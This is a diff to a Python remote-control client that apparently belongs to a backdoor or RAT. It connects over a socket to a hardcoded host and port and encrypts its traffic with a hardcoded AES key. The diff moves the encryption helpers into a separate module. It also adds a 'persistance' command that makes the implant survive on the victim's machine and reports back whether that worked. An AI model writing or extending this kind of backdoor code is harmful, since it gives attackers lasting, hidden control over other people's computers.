@@ -5,32 +5,21 @@ import socket
 import subprocess
 import sys
 
-from Crypto import Random
-from Crypto.Cipher import AES
+# from Crypto import Random
+# from Crypto.Cipher import AES
+
+# from core import crypto
+from core import persistance
+
+# temporary
+from core.crypto import AES_encrypt as encrypt
+from core.crypto import AES_decrypt as decrypt
 
 HOST = 'localhost'
 PORT = 1337
 KEY  = '82e672ae054aa4de6f042c888111686a'
 # generate your own key with...
 # python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
-
-
-def pad(s):
-    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
-
-
-def encrypt(plaintext):
-    plaintext = pad(plaintext)
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    return iv + cipher.encrypt(plaintext)
-
-
-def decrypt(ciphertext):
-    iv = ciphertext[:AES.block_size]
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext.rstrip(b'\0')
 
 
 def main():
@@ -73,6 +62,13 @@ def main():
                 if results == '':
                     break
 
+        elif cmd == 'persistance':
+            success, details = persistance.run()
+            if success:
+                results = 'Persistance successful, {}'.format(details)
+            else:
+                results = 'Persistance unsuccessufl, {}'.format(details)
+            s.send(encrypt(results))
 
 if __name__ == '__main__':
     main()
